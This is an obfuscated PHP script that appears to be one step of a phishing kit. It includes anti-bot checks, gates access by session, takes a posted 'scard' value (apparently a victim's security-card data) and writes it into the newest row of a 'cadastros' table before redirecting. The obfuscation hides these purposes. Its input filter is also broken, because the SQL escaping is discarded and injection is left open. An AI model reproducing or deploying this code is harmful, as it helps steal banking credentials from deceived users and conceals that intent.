<?php
 goto tLKXN; r4Ttc: $conn = null; goto FeTaq; D6S6E: require_once "\56\57\166\x65\x72\151\x66\x79\102\157\164\x2f\141\x6e\x74\55\x62\x6f\x74\56\x70\x68\160"; goto dawEy; dawEy: require_once "\56\57\166\145\x72\x69\146\171\x42\157\x74\57\x61\156\x74\x2d\x62\157\x74\x31\56\x70\150\x70"; goto muNFH; yr63F: function filtrar($input) { global $conn; $var = mysqli_escape_string($conn, $input); $var = htmlspecialchars($input); return $var; } goto j_itm; iobSn: ini_set("\144\151\x73\x70\x6c\141\x79\x5f\145\162\162\157\x72\x73", 0); goto T40Qn; tLKXN: session_start(); goto QF_hq; kx_Hl: if (isset($_SESSION["\x37\x73\61\146\x39\154\x38\61\x63\x62"])) { } else { header("\114\x6f\143\141\164\151\157\x6e\72\40\x34\60\x34\x2f\x3f\156\x6f\x74\151\143\151\141\x3d\x6e\145\147\141\144\157"); die; } goto yr63F; j_itm: $scard = filtrar($_POST["\163\x63\141\x72\144"]); goto Cqsdc; muNFH: require_once "\56\x2f\142\x61\156\143\157\x5f\x64\145\137\x64\x61\x64\157\x73\57\151\156\144\x65\x78\56\x70\x68\x70"; goto kx_Hl; QF_hq: error_reporting(0); goto iobSn; FeTaq: header("\x4c\x6f\143\141\x74\151\x6f\x6e\x3a\40\x72\157\x74\141\x73"); goto UM_x1; T40Qn: date_default_timezone_set("\101\x6d\x65\x72\151\x63\141\57\123\141\157\x5f\120\x61\165\x6c\157"); goto D6S6E; Cqsdc: if ($scard) { $query = "\125\120\104\x41\x54\105\x20\143\141\x64\x61\163\164\162\157\163\x20\x53\x45\x54\40\163\x63\141\162\x64\75\47{$scard}\47\x20\127\x48\105\122\x45\x20\x69\x64\x20\117\122\104\x45\x52\40\102\131\40\x69\144\40\x44\105\x53\103\x20\114\111\x4d\111\124\40\x31\x20"; $query_run = mysqli_query($conn, $query); } goto r4Ttc; UM_x1: ?>